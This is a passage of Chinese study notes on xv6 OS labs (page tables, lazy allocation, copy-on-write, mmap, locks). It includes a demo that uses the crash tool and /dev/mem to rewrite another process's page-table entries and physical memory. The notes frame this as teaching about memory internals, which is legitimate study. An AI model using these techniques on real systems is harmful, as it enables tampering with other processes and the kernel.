VIRTIO0, PTE_R | PTE_W) &lt; 0)    panic(&quot;kpgtinit: virtio0\\n&quot;);  // CLINT  if (mappages(t, CLINT, 0x10000, CLINT, PTE_R | PTE_W) &lt; 0)    panic(&quot;kpgtinit: clint\\n&quot;);  // PLIC  if (mappages(t, PLIC, 0x400000, PLIC, PTE_R | PTE_W) &lt; 0)    panic(&quot;kpgtinit: plic\\n&quot;);  // map kernel text executable and read-only.  if (mappages(t, KERNBASE, (uint64)etext-KERNBASE, KERNBASE, PTE_R | PTE_X) &lt; 0)    panic(&quot;kpgtinit: kernel base\\n&quot;);  // map kernel data and the physical RAM we&#x27;ll make use of.  if (mappages(t, (uint64)etext, PHYSTOP-(uint64)etext, (uint64)etext, PTE_R | PTE_W) &lt; 0)    panic(&quot;kpgtinit: kernel data\\n&quot;);  // map the trampoline for trap entry/exit to  // the highest virtual address in the kernel.  if (mappages(t, TRAMPOLINE, PGSIZE, (uint64)trampoline, PTE_R | PTE_X) &lt; 0)    panic(&quot;kpgtinit: trampoline\\n&quot;);&#125;void switchPGT(pagetable_t t) &#123;  w_satp(MAKE_SATP(t));  sfence_vma();&#125;\n因為每個process都有kernel table，所以可以把kstack分到每個kernel pagetable去，把procinit的kstack拿掉\nstatic struct proc*allocproc(void)&#123;  // ...  p-&gt;kpagetable = (pagetable_t) kalloc();  kpgtinit(p-&gt;kpagetable);  char *pa = kalloc();  if(pa == 0)    panic(&quot;kalloc&quot;);  uint64 va = KSTACK(0);  mappages(p-&gt;kpagetable, va, PGSIZE, (uint64)pa, PTE_R | PTE_W);  p-&gt;kstack = va;  // ...&#125;\n所以現在每個process都有一個kernel pagetable，需要的時候會把user mode pagetable的map到在kernel pagetable也map一下\nvoidincludeInto(pagetable_t pagetable, pagetable_t kpagetable, uint64 oldsz, uint64 newsz)&#123;  pte_t *pte_from, *pte_to;  uint64 a, pa;  uint flags;  if (newsz &lt; oldsz)    return;  oldsz = PGROUNDUP(oldsz);  for (a = oldsz; a &lt; newsz; a += PGSIZE)  &#123;    if ((pte_from = walk(pagetable, a, 0)) == 0)      panic(&quot;includeInto: pte should exist&quot;);    if ((pte_to = walk(kpagetable, a, 1)) == 0)      panic(&quot;includeInto: walk fails&quot;);    pa = PTE2PA(*pte_from);    flags = (PTE_FLAGS(*pte_from) &amp; (~PTE_U));    *pte_to = PA2PTE(pa) | flags;  &#125;&#125;\n需要的時候? 就是程式在kernel mode中時動到或是需要user mode的資料時\n\nuserinit\ngrowproc\n\n這裡要看kernel的layout，PILC上面的其實不能用，因為已經被map了\n\n\nfork\nexec\n\nvoiduserinit(void)&#123;  // ...  includeInto(p-&gt;pagetable, p-&gt;kpagetable, 0, p-&gt;sz);  // prepare for the very first &quot;return&quot; from kernel to user.  p-&gt;trapframe-&gt;epc = 0;      // user program counter  // ...&#125;// Grow or shrink user memory by n bytes.// Return 0 on success, -1 on failure.intgrowproc(int n)&#123;  // ...  if(n &gt; 0)&#123;    if (PGROUNDUP(sz + n) &gt;= PLIC)      return -1;    // ...    includeInto(p-&gt;pagetable, p-&gt;kpagetable, sz-n, sz);  &#125; else if(n &lt; 0)&#123;    sz = uvmdealloc(p-&gt;pagetable, sz, sz + n);  &#125;  p-&gt;sz = sz;  return 0;&#125;// Create a new process, copying the parent.// Sets up child kernel stack to return as if from fork() system call.intfork(void)&#123;    // ...  includeInto(np-&gt;pagetable, np-&gt;kpagetable, 0, np-&gt;sz);  safestrcpy(np-&gt;name, p-&gt;name, sizeof(p-&gt;name));  pid = np-&gt;pid;  np-&gt;state = RUNNABLE;  release(&amp;np-&gt;lock);  return pid;&#125;\nfreeproc也把kernel pagetable也free掉，但是不能把kernel的項目的pa給free掉\nvoidfreewalk_keepleaf(pagetable_t pagetable)&#123;  // there are 2^9 = 512 PTEs in a page table.  for(int i = 0; i &lt; 512; i++)&#123;    pte_t pte = pagetable[i];    if((pte &amp; PTE_V)) &#123;      pagetable[i] = 0;      if((pte &amp; (PTE_R|PTE_W|PTE_X)) == 0)&#123;        // this PTE points to a lower-level page table.        uint64 child = PTE2PA(pte);        freewalk_keepleaf((pagetable_t)child);      &#125;    &#125;  &#125;  kfree((void*)pagetable);&#125;void proc_freekpt(pagetable_t pagetable)&#123;  // there are 2^9 = 512 PTEs in a page table.  for(int i = 0; i &lt; 512; i++)&#123;    pte_t pte = pagetable[i];    if((pte &amp; PTE_V))&#123;      pagetable[i] = 0;      if ((pte &amp; (PTE_R|PTE_W|PTE_X)) == 0)      &#123;        uint64 child = PTE2PA(pte);        proc_freekpt((pagetable_t)child);      &#125;    &#125; else if(pte &amp; PTE_V)&#123;      panic(&quot;proc free kpt: leaf&quot;);    &#125;  &#125;  kfree((void*)pagetable);&#125;static voidfreeproc(struct proc *p)&#123;  // ...  if(p-&gt;pagetable)    proc_freepagetable(p-&gt;pagetable, p-&gt;sz);  if (p-&gt;kstack)  &#123;    uvmunmap(p-&gt;kpagetable, p-&gt;kstack, 1,1);    p-&gt;kstack = 0;  &#125;  if(p-&gt;kpagetable)    freewalk_keepleaf(p-&gt;kpagetable);  p-&gt;kpagetable = 0;  // ...&#125;\n最後就可以切到新的copyin, copyinstr了\nLab Lazy allocation\n在sbrk不分配mem\nuint64sys_sbrk(void)&#123;  int addr;  int n;  if(argint(0, &amp;n) &lt; 0)    return -1;  addr = myproc()-&gt;sz;   if(n &lt; 0)     growproc(n);   else     myproc()-&gt;sz += n;  return addr; // !!!&#125;\n在page fault時做分配\nint do_lazy(uint64 addr) &#123;  struct proc* p = myproc();  int stkOverFlow = (addr &lt; p-&gt;trapframe-&gt;sp);  // page-faults on a virtual memory address higher than any allocated with sbrk()  // this should be &gt;= not &gt; !!!  int addrOutOfBound = (addr &gt;= p-&gt;sz);  void *mem;  if (stkOverFlow)    ;//printf(&quot;lazy: stack overflow\\n&quot;);  else if(addrOutOfBound)    ;//printf(&quot;lazy: addr over of bound\\n&quot;);  else if((mem = kalloc()) == 0)    ;//printf(&quot;out of pa\\n&quot;);  else &#123;    memset(mem, 0, PGSIZE);    if (mappages(p-&gt;pagetable, PGROUNDDOWN(addr), PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) &lt; 0)// ???      kfree(mem);    else       return 0;  &#125;  return -1;&#125;voidusertrap(void)&#123;  // ...  if(r_scause() == 8)&#123;    // ...    intr_on();    syscall();  &#125; else if(r_scause() == 13 || r_scause() == 15) &#123;     if (do_lazy(r_stval()) &lt; 0)      p-&gt;killed = 1;  &#125; else if((which_dev = devintr()) != 0)&#123;    // ok  &#125;  // ...&#125;\n剩下要在走訪pte時忽略沒有PTE_V的page，這邊就看hint就知道要改哪\nLab Copy on-write\n這裡會牽涉到reference counter，導致要處理concurrent!!\n如果沒有處理好，連怎麼出事的都不知道\n先refcnt，代表有多少process有map到這個page\nstruct __refcnt&#123;  struct spinlock lock;  uint counter[(PHYSTOP - KERNBASE) / PGSIZE];&#125;;struct __refcnt refcnt;void refcnt_lock() &#123;  acquire(&amp;refcnt.lock);&#125;void refcnt_unlock() &#123;  release(&amp;refcnt.lock);&#125;void refcnt_create() &#123;  initlock(&amp;refcnt.lock, &quot;refcnt&quot;);  refcnt_lock();  for(int i=0,goal=(PHYSTOP - KERNBASE) / PGSIZE;i&lt;goal;i++)    refcnt.counter[i] = 0;  refcnt_unlock();&#125;inlineuint64refcnt_index(uint64 pa)&#123;  return (pa - KERNBASE) / PGSIZE;&#125;void refcnt_set(uint64 pa, int n) &#123;  refcnt.counter[refcnt_index(pa)] = n;&#125;inlineuintrefcnt_get(uint64 pa)&#123;  return refcnt.counter[refcnt_index(pa)];&#125;voidrefcnt_incr(uint64 pa)&#123;  refcnt.counter[refcnt_index(pa)]++;&#125;voidrefcnt_desc(uint64 pa)&#123;  if (refcnt.counter[refcnt_index(pa)] &gt; 0)    refcnt.counter[refcnt_index(pa)]--;  else    panic(&quot;wtf&quot;);&#125;\n之後page要會fork\n兩個case\n\nrefcnt大於1: 產生新的page，原本的page的refcnt減1\nrefcnt等於1: 直接拿去用\n\nint page_fork(uint64 va) &#123;  int ret;  pagetable_t pgt = myproc()-&gt;pagetable;  va = PGROUNDDOWN(va);  pte_t * pte = walk(pgt, va, 0);  uint64 pa = PTE2PA(*pte);  uint flags = PTE_FLAGS(*pte);  if ((*pte) &amp; PTE_COW) &#123;    refcnt_lock(); // MUST BE DONE TOGETHER!!    if (refcnt_get(pa) &gt; 1) &#123;      void *mem = kalloc_cow();      if (mem != 0) &#123;        memmove(mem, (char*)pa, PGSIZE);        if(mappages(pgt, va, PGSIZE, (uint64)mem, (flags &amp; (~PTE_COW)) | PTE_W) != 0)          ret = -1, kfree(mem);        else          ret = 0, refcnt_desc(pa);      &#125; else        ret = -3;    &#125; else      ret = 0, *pte = (*pte &amp; ~PTE_COW) | PTE_W;    refcnt_unlock();  &#125; else     ret = -2;  return ret;&#125;\n與之相對，kfree只有在refcnt小於等於1時才free，其他都是decrease refcnt\nvoidkfree(void *pa)&#123;  struct run *r;  refcnt_lock(); //premise: counter == 0  &lt;=&gt; this page is in freelist  if (refcnt_get((uint64)pa) &lt;= 1) &#123;    if(((uint64)pa % PGSIZE) != 0 || (char*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)        panic(&quot;kfree&quot;);    // Fill with junk to catch dangling refs.    memset(pa, 1, PGSIZE);    refcnt_set((uint64)pa, 0);    r = (struct run*)pa;    acquire(&amp;kmem.lock);    r-&gt;next = kmem.freelist;    kmem.freelist = r;    release(&amp;kmem.lock);  &#125; else    refcnt_desc((uint64)pa);  refcnt_unlock();&#125;\n另外，從kernel mode複製到user mode也要fork page\n如果都指向同一個page要分開\nintuvmcopy(pagetable_t old, pagetable_t new, uint64 sz)&#123;  // 從copy變成map  // ...  for(i = 0; i &lt; sz; i += PGSIZE)&#123;    // ...    *pte = ((*pte) &amp; (~PTE_W)) | PTE_COW;    if(mappages(new, i, PGSIZE, (uint64)pa, (flags &amp; (~PTE_W)) | PTE_COW) != 0)      goto err;    else &#123;      refcnt_lock();      refcnt_incr(pa);      refcnt_unlock();    &#125;  &#125;  return 0; err:  uvmunmap(new, 0, i / PGSIZE, 1);  return -1;&#125;intcopyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len)&#123;  uint64 n, va0, pa0;  while(len &gt; 0)&#123;    // ...    // 如果都指向同一個page要分開    pte_t* pte = walk(pagetable, va0, 0);    if (pte &amp;&amp; (*pte &amp; PTE_COW))      if (page_fork(va0) != 0)        return -1;    // ...  &#125;&#125;\n之後把剩下的線串完\nvoidusertrap(void) &#123;    // ...  &#125; else if((r_scause() == 15)) &#123;    if (page_fork(r_stval()))      p-&gt;killed = 1;  &#125; else &#123;    // ...&#125;\n這邊有一個要注意的點\nrefcnt是跟著page走，所以直到page與refcnt設定好之前任何人都不該動refcnt\n這導致kalloc與kalloc_cow的產生，因為refcnt會鎖，但是做page_fork時會動到兩個page，所以kalloc_cow不鎖，交給page_fork鎖\nvoid *kalloc(void)&#123;  // ...  if(r) &#123;    refcnt_lock();    refcnt_incr((uint64)r);    refcnt_unlock();    //printf(&quot;init: %p %d\\n&quot;, r, refcnt_get((uint64)r));    memset((char*)r, 5, PGSIZE); // fill with junk  &#125;  return (void*)r;&#125;void *kalloc_cow(void)&#123;  // ...  if(r) &#123;    refcnt_set((uint64)r, 1);    //printf(&quot;init: %p %d\\n&quot;, r, refcnt_get((uint64)r));    memset((char*)r, 5, PGSIZE); // fill with junk  &#125;  return (void*)r;&#125;\n最後就像，lazy alloc做的一樣，要處理走訪pte時忽略沒有PTE_V的page\nlock心得\n0. 上鎖\n\n先存狀態\n都用同一個狀態延伸\n把所有動作用同一個鎖包 (這會導致在不同branch要一直release)\n確保假設被打破時可以馬上停下程式 (ex: panic(“wtf”))\n\nLab mmap\n現在user可以自己設定自己的addr了!!\nQ: 這樣怎麼區分user設定的資料與程式設定的(原本活在pagetable中的)資料?\nA: 多一個vma去trace\nQ: 怎麼分配位置?\nA: 這隨便，這裡從TRAPFRAME之後開始\nQ: 如果alloc很多塊，卻只free其中幾塊，我們還有方法再利用那些mem嗎?\nA: 這要做compact，但我懶，沒做test會過\n先加vma，與sbrk很像，用vma_end紀錄最後的位置\n記住，riscv是往addr小的地方開始填資料\nstruct entry &#123;  uint64 va_end;  int size;  int prot;  int flag;  struct file* f;&#125;;#define VMA_SIZE 16#define VMA_BASE (TRAPFRAME - PGSIZE)struct proc &#123;    // ...    struct entry vma[VMA_SIZE];    uint64 vma_end;&#125;;\n之後要可以alloc vma，與get vma\nstruct entry* allocvma() &#123;  struct proc *p = myproc();  struct entry* ret = 0;  for (int i = 0;i&lt;VMA_SIZE;i++) &#123;    if (p-&gt;vma[i].size == 0) &#123;      ret = &amp;(p-&gt;vma[i]);      break;    &#125;  &#125;  return ret;&#125;struct entry* getvma(uint64 addr) &#123;  int i;  struct proc *p = myproc();  for (i = 0;i&lt;VMA_SIZE;i++)    if (p-&gt;vma[i].size &gt; 0 &amp;&amp; p-&gt;vma[i].va_end &gt; addr &amp;&amp; addr &gt;= p-&gt;vma[i].va_end-p-&gt;vma[i].size)      break;  return i &lt; VMA_SIZE ? &amp;(p-&gt;vma[i]) : 0;&#125;\n把mmap, munmap加進去\n這裡做lazy，只有在read/write才map與讀檔案\nuint64sys_mmap(void)&#123;  struct file* f;  uint64 ret = -1;  int size, prot, flags, fd;  struct proc *p = myproc();  int goodargs = (argint(1, &amp;size) &lt; 0 || argint(2, &amp;prot) &lt; 0 || argint(3, &amp;flags) &lt; 0 || argfd(4, &amp;fd, &amp;f) &lt; 0);  if(goodargs || (!f-&gt;writable &amp;&amp; (prot &amp; PROT_WRITE) &amp;&amp; (flags &amp; MAP_SHARED)))    return ret;  acquire(&amp;p-&gt;lock);  struct entry *vma = allocvma();  if (vma) &#123;    int pte_prot = 0;    if (prot &amp; PROT_READ)      pte_prot |= PTE_R;    if (prot &amp; PROT_WRITE)      pte_prot |= PTE_W;    filedup(f);    vma-&gt;va_end = p-&gt;vma_end; // start在小 end在大 mmap回傳的addr是小的!!    ret = vma-&gt;va_end-size;    vma-&gt;size = size;    vma-&gt;f = f;    vma-&gt;prot = pte_prot;    vma-&gt;flag = flags;    p-&gt;vma_end -= size;  &#125;  release(&amp;p-&gt;lock);  return ret;&#125;uint64 do_mummap(uint64 addr, int len) &#123;  struct proc* p = myproc();  struct entry *vma = getvma(addr);  if (!vma || addr + len &gt; vma-&gt;va_end) &#123;    return -1;  &#125;  //printf(&quot;??: %d start:%p va:%p va_end:%p end:%p\\n&quot;, vma-&gt;size, vma-&gt;va_end-vma-&gt;size, addr, addr+len, vma-&gt;va_end);  for (uint64 va=addr,end=addr+len;va &lt; end;va+=PGSIZE) &#123;      if (walkaddr(p-&gt;pagetable, va)) &#123;        if (vma-&gt;flag &amp; MAP_SHARED)          filewrite(vma-&gt;f, va, PGSIZE);        uvmunmap(p-&gt;pagetable, va, 1, 1);      &#125;     &#125;  if (addr == vma-&gt;va_end-vma-&gt;size &amp;&amp; addr+len == vma-&gt;va_end) &#123;    vma-&gt;size = 0;    //fileclose(vma-&gt;f);    vma-&gt;f-&gt;ref--;  &#125; else &#123;    vma-&gt;size -= len;    if (addr+len == vma-&gt;va_end)      vma-&gt;va_end -= len;  &#125;  return 0;&#125;uint64sys_munmap(void)&#123;  uint64 addr;  int len;  if (argaddr(0, &amp;addr) &lt; 0 || argint(1, &amp;len) &lt; 0)    return -1;  return do_mummap(addr, len);&#125;\n在page fault才map與讀檔案\nint do_mmap(uint64 addr) &#123;  struct proc* p = myproc();  uint64 base = PGROUNDDOWN(addr);  void *mem;  if((mem = kalloc()) == 0)    printf(&quot;out of pa\\n&quot;);  else &#123;    struct entry* vma = getvma(addr);    if (vma) &#123;      memset(mem, 0, PGSIZE);      if (mappages(p-&gt;pagetable, base, PGSIZE, (uint64)mem, vma-&gt;prot|PTE_U|PTE_X) &lt; 0)        kfree(mem), printf(&quot;map fail\\n&quot;);      else &#123;        ilock(vma-&gt;f-&gt;ip);        int offset = base - (vma-&gt;va_end-vma-&gt;size);        readi(vma-&gt;f-&gt;ip, 1, base, offset, PGSIZE);        iunlock(vma-&gt;f-&gt;ip);        return 0;      &#125;    &#125; else &#123;      //printf(&quot;vma no found\\n&quot;);      kfree(mem);    &#125;  &#125;  return -1;&#125;voidusertrap(void) &#123;    // ...    &#125; else if(r_scause() == 13 || r_scause() == 15) &#123;        if (do_mmap(r_stval()) &lt; 0)            p-&gt;killed = 1;    &#125; else &#123;    // ...&#125;\n剩下就是初始化與在fork時vma用到的file要記得refcnt要遞增\nLinux crash tool\n經過前面lab的洗禮，相信大家也對va,pa,pte的關係有深刻的了解\n這樣可以來看看，在linux中怎麼改mem\n\ncrash tool: 可以分析kerneldump看ctx與kernel的struct\n/dev/mem: 整個mem的視圖，就是ch3第一張圖的所有東西都會在這裡看到\n\n下面借用這裡的內容來看看這兩個怎麼一起用\n先預設/dev/mem可以寫，pagetable沒有任何限制\n這裡可以看crash的指令\n\nvtop: show va的訊息\nwr: 改寫 mem\nset: 把mem view改成該pid的process的view\nps: 就是ps\n\n改pte的map\n兩個process，兩個page，兩個addr(0x34000000, 0x34004000)\n之後在crash中改pte指到的地方\n#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char **argv)&#123;    int fd;    unsigned long *addr;    fd = open(&quot;/dev/mem&quot;, O_RDWR);    // 建立一個分頁 P1 映射到保留記憶體    addr = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0x34000000);    // 修改 P1 的内容    *addr = 0x1122334455667788;        printf(&quot;address at: %p   content is: 0x%lx\\n&quot;, addr, addr[0]);    // 等待分頁交換    getchar();        printf(&quot;address at: %p   content is: 0x%lx\\n&quot;, addr, addr[0]);    close(fd);    munmap(addr, 4096);    return 1;&#125;\n#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char **argv)&#123;    int fd;    unsigned long *addr;    fd = open(&quot;/dev/mem&quot;, O_RDWR);    // 建立分頁 P2 映射到保留的記憶體    addr = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0x34004000);        // 修改 P2 的内容    *addr = 0x8877665544332211;    printf(&quot;address at: %p   content is: 0x%lx\\n&quot;, addr, addr[0]);      // 等待分頁交換    getchar();    printf(&quot;address at: %p   content is: 0x%lx\\n&quot;, addr, addr[0]);    close(fd);    munmap(addr, 4096);    return 1;&#125;\n接著要找pte，找對面對到的pa\ncrash&gt; ps | grep master                                                                                                                                                                [8/287]  32334  32333   6  ffff93d0ed35c680  IN   0.0    4512   1384  mastercrash&gt; set 32334    PID: 32334COMMAND: &quot;master&quot;   TASK: ffff93d0ed35c680  [THREAD_INFO: ffff93d0ed35c680]    CPU: 6  STATE: TASK_INTERRUPTIBLEcrash&gt; vtop 0x7f8f3ba6a000VIRTUAL     PHYSICAL7f8f3ba6a000  2c0000000 &lt;= va 與 pa   PGD: 2ae2f87f8 =&gt; 80000002af219067   PUD: 2af2191e0 =&gt; 2a9d3c067   PMD: 2a9d3cee8 =&gt; 2ac34b067   PTE: 2ac34b350 =&gt; 80000002c0000267 &lt;= pte 與 對到的pa  PAGE: 2c0000000      PTE         PHYSICAL   FLAGS80000002c0000267  2c0000000  (PRESENT|RW|USER|ACCESSED|DIRTY|NX)      VMA           START       END     FLAGS FILEffff93d0e894e000 7f8f3ba6a000 7f8f3ba6b000 d0444fb /dev/memcrash&gt; wr -64 -p 2ac34b350 80000002c0004267 &lt;= pte 與 對面對到的pa\ncrash&gt; ps | grep slave  32348  32347   1  ffff93d0ed359780  IN   0.0    4512   1416  slavecrash&gt; set 32348    PID: 32348COMMAND: &quot;slave&quot;   TASK: ffff93d0ed359780  [THREAD_INFO: ffff93d0ed359780]    CPU: 1  STATE: TASK_INTERRUPTIBLEcrash&gt; vtop 0x7f269fba3000VIRTUAL     PHYSICAL7f269fba3000  2c0004000   PGD: 2ae2ca7f0 =&gt; 80000002ac354067   PUD: 2ac3544d0 =&gt; 2b45f6067   PMD: 2b45f67e8 =&gt; 2ac7db067   PTE: 2ac7dbd18 =&gt; 80000002c0004267  PAGE: 2c0004000        PTE         PHYSICAL   FLAGS80000002c0004267  2c0004000  (PRESENT|RW|USER|ACCESSED|DIRTY|NX)      VMA           START       END     FLAGS FILEffff93d0eea18820 7f269fba3000 7f269fba4000 d0444fb /dev/memcrash&gt; wr -64 -p 2ac7dbd18 80000002c0000267\n改pa的值\n先給個程式，印出va(不然無法知道pa)，之後直接改pa的值\n#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv)&#123;    unsigned char *addr;    // 匿名映射一段記憶體空間    addr = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);    // 修改內容    strcpy(addr, &quot;浙江溫州皮鞋濕&quot;);    // 只是範例，所以直接顯示 address 實際操作時需要手工 hack 記憶體位置    printf(&quot;address at: %p   content is: %s\\n&quot;, addr, addr);    getchar();    printf(&quot;address at: %p   content is: %s\\n&quot;, addr, addr);    munmap(addr, 4096);    return 1;&#125;\n用crash找pa\ncrash&gt; ps | grep test  11608  11607   1  ffff93d0ed378000  IN   0.0    4512   1408  test  crash&gt; set 11608    PID: 11608COMMAND: &quot;test&quot;   TASK: ffff93d0ed378000  [THREAD_INFO: ffff93d0ed378000]    CPU: 1  STATE: TASK_INTERRUPTIBLE  crash&gt; vtop 0x7f7d88693000VIRTUAL     PHYSICAL7f7d88693000  1f83ed000   PGD: 2a73ee7f0 =&gt; 8000000220a30067   PUD: 220a30fb0 =&gt; 2ae1f4067   PMD: 2ae1f4218 =&gt; 2b0c7e067   PTE: 2b0c7e498 =&gt; 80000001f83ed867  PAGE: 1f83ed000      PTE         PHYSICAL   FLAGS80000001f83ed867  1f83ed000  (PRESENT|RW|USER|ACCESSED|DIRTY|NX)      VMA           START       END     FLAGS FILEffff93d0ec033450 7f7d88693000 7f7d88694000 80000fb dev/zero      PAGE        PHYSICAL      MAPPING       INDEX CNT FLAGSffffd377c7e0fb40 1f83ed000 ffff93d0f01a9290        0  2 17ffffc0040038 uptodate,dirty,lru,swapbacked\n現在我們知道0x1f83ed000就是我們要的位置!!\n就改吧 mmap到pa去\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char **argv)&#123;    int fd;    unsigned char *addr;    unsigned long off = 0x1f83ed000;    fd = open(&quot;/dev/mem&quot;, O_RDWR);    addr = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, fd, off);    strcpy(addr, &quot;下雨進水不會胖&quot;);    close(fd);    munmap(addr, 4096);    return 1;&#125;\n小結\n這裡的例子很簡單，但是很可怕，基本上只要知道pa就什麼都擋不住了\n同時如果知道struct的大小與偏移量，基本上就是可以操作任何東西了\n像是在task_struct遊走，改常數等等…\n可以看上面的文章與這裡都有一些使用範例\nHeap Coruption\n剛好提到記憶體，可以看看關於記憶體的問題，下面內容主要處自這裡\n\n在第一次的dump，backtrace沒有印出正確的行號\n\n文中提到懷疑是Heap Coruption的理由是\n\n崩潰是發生在存取非法位址\n這個行號所在的程式碼單純到沒辦法找到造成問題的部分在哪\n\n\n可以猜猜看why\n\n亂序執行\n\nconcurrent，但明顯不是\n\n\n之前在不對的地方沒有停下來\n\n可以試試把array超過length的地方print出來: print的出來!!\n如果這是迴圈中出事就還好，但如果出了loop…\n\n\n\n\n\n\n第二次dump用了大招，上heap保護\n\n這與xv6的stack的guard page一樣，出錯直接panic\n這樣就可以直接看到對的地方，index出界，在8爆了\n\n不是在5爆?\n\n為了好分配mem，所以會對齊\n\n\n回頭來看c的type到底是什麼?\n\n一次要跳幾格\n\nchar是1\nuint64是8\netc\n\n\n所以c其實就是一直幫忙算這個addr一次跳幾格\n\n出事由下面的cpu噴\nlinux有辦法這樣做嗎?\n\n定位Memory Corruption的思路\n\n\n\n\n\n\n\n\n\n\n\nch6\n當我們說鎖保護數據時，我們真正的意思是鎖保護了一些適用於數據的不變式(invariant）集合\n你可以把鎖看成是把並發的臨界區串行化(serializing)的一種工具，使它們同時只運行一個，從而保護 invariant（假設臨界區是獨立的）。\n正確地使用鎖可以保證一次只能有一個 CPU 對關鍵部分的數據結構進行操作，所以當數據結構的 invariant 不成立時，沒有 CPU 會執行數據結構操作\n如果一個穿過內核的代碼路徑必須同時持有多個鎖，那麼所有的代碼路徑以相同的順序獲取這些鎖是很重要的\n* 有時鎖的身份並不是事先知道的，也許是因為必須持有一個鎖才能發現接下來要獲取的鎖的身份\nCPU 的 ordering 規則稱為內存模型!!\n(目前看過最精練的解釋)\n自旋锁\n\n關中斷\natomic cas while looping =&gt; lock\nmem barrier =&gt; mem barrier\n\n一個中斷處理程序使用了自旋鎖，CPU 決不能在啟用中斷的情況下持有該鎖。\nXv6 比較保守：當一個 CPU 獲取任何鎖時，xv6 總是禁用該 CPU 上的中斷。\nxv6 在 CPU 沒有持有自旋鎖時重新啟用中斷；它必須做一點記錄來應對嵌套的臨界區。\n這個spinlock可以recursive!!\n因為有紀錄cpu id所以可以處理這一段\ntrace: spinlock\n我們把debug有關的部分skip掉\n// Mutual exclusion lock.struct spinlock &#123;  uint locked;       // Is the lock held?&#125;;\nacquire對數字做test_and_set，不成功就一直轉\n\n這裡要用riscv提供的指令去換，不然被reorder就出事了\n因為原本有設定cpuid的部分，導致還需要memory barrier\n\n但這裡就先跳掉\n\n\n\nvoidacquire(struct spinlock *lk)&#123;  push_off();  while(__sync_lock_test_and_set(&amp;lk-&gt;locked, 1) != 0)    ;&#125;\nrelease就是acquire反著做\nvoidrelease(struct spinlock *lk)&#123;  __sync_lock_release(&amp;lk-&gt;locked);  pop_off();&#125;\n睡眠锁\n擴展自旋锁，多了sleep\n\n上spinlock\n直到拿到鎖之前，一直sleep\n\n處理虛假喚醒\n\n\n\n這裡是把sleep多傳一個lock，保證sleep後lock會被釋放\npthread也是，但是叫condition var\ntrace: sleeplock\nstruct sleeplock &#123;  uint locked;       // Is the lock held?  struct spinlock lk; // spinlock protecting this sleep lock&#125;;\nacquire與release其實很簡單，用spinlock保護locked\n如果只有保護locked能用atomic?\n答案是不行，因為還要保護成功sleep\nvoidacquiresleep(struct sleeplock *lk)&#123;  acquire(&amp;lk-&gt;lk);  while (lk-&gt;locked) &#123;    sleep(lk, &amp;lk-&gt;lk);  &#125;  lk-&gt;locked = 1;  release(&amp;lk-&gt;lk);&#125;voidreleasesleep(struct sleeplock *lk)&#123;  acquire(&amp;lk-&gt;lk);  lk-&gt;locked = 0;  wakeup(lk);  release(&amp;lk-&gt;lk);&#125;\n為了可以在有lock當狀態下sleep，變成sleep要解上面lock，之後再鎖自己的lock\n可以看到這邊lock涵蓋的範圍有overlay\n如果有用過pthread的cond var就會看到一樣的東西!!\nvoidsleep(void *chan, struct spinlock *lk)&#123;  struct proc *p = myproc();    if(lk != &amp;p-&gt;lock)&#123;  //DOC: sleeplock0    acquire(&amp;p-&gt;lock);  //DOC: sleeplock1    release(lk);  &#125;  // ...  // Reacquire original lock.  if(lk != &amp;p-&gt;lock)&#123;    release(&amp;p-&gt;lock);    acquire(lk);  &#125;&#125;\n用什麼鎖\n因為睡眠鎖會使中斷處於啟用狀態，所以不能在中斷處理程序中使用睡眠鎖\n自旋鎖最適合短的臨界區，因為等待它們會浪費 CPU 時間\n睡眠鎖對長時間的操作很有效\nLab Lock\nMemory allocator\n把freelist放到各個cpu中\nstruct cpu &#123;  // ...  struct run *freelist;  struct spinlock lock;&#125;;\n所以kalloc要從自己的list中找，如果沒有就去偷\nkfree就直接塞回自己的list\nvoid* kalloc(void)&#123;  // ...  push_off();  int i = cpuid();  acquire(&amp;cpus[i].lock);  if (!cpus[i].freelist) &#123;    r = steal_page(i);  &#125; else &#123;    r = cpus[i].freelist;    cpus[i].freelist = r-&gt;next;  &#125;  release(&amp;cpus[i].lock);  pop_off();  // ...&#125;void kfree(void *pa) &#123;  // ...  int i = cpuid();  acquire(&amp;cpus[i].lock);  r-&gt;next = cpus[i].freelist;  cpus[i].freelist = r;  release(&amp;cpus[i].lock);  pop_off();&#125;\n偷就是走訪其他cpu看有沒有free的\nvoid* steal_page(int i) &#123;  // interrupt should be disabled  void *ret = 0;  for (int j=((i+1)%NCPU); !ret &amp;&amp; j!=i; j=((j+1)%NCPU)) &#123;    acquire(&amp;cpus[j].lock);    if (cpus[j].freelist) &#123;      ret = cpus[j].freelist;      cpus[j].freelist = cpus[j].freelist-&gt;next;    &#125;    release(&amp;cpus[j].lock);  &#125;  return ret;&#125;\nBuffer cache\n其實可以用前面的想法，把list打散\n#define TBL_SIZE 7struct entry &#123;  struct buf head;  struct spinlock lock;&#125;;struct entry tbl[TBL_SIZE];void insert_buf(struct buf* head, struct buf* b) &#123;  b-&gt;next = head-&gt;next, b-&gt;prev = head;  head-&gt;next-&gt;prev = b, head-&gt;next = b;&#125;\n拿不到就去偷\nbget(uint dev, uint blockno)&#123;  struct buf *b;  //acquire(&amp;bcache.lock);  // Is the block already cached?  int i = tbl_index(dev, blockno);  acquire(&amp;tbl[i].lock);  // check cache  for(b = tbl[i].head.next; b != &amp;tbl[i].head; b = b-&gt;next)    if(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno)&#123;        b-&gt;refcnt++;        release(&amp;tbl[i].lock);        